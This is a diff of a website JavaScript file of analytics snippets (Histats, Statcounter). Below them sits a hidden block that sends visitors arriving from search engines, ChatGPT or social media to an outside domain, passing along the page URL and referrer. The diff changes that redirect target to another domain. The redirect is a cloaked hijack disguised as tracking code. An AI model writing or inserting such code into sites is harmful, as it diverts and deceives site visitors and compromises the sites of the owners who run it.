@@ -1,5 +1,5 @@
 //Histats
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943554&101"/>');
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4963262&101"/>');
 
 ///// Statcounter /////
 var sc_project=13049188; 
@@ -16,5 +16,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'http://blog.wm.edu.pl';
+var ars = 'http://kuge.wolfarmy.net';
 if(['.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
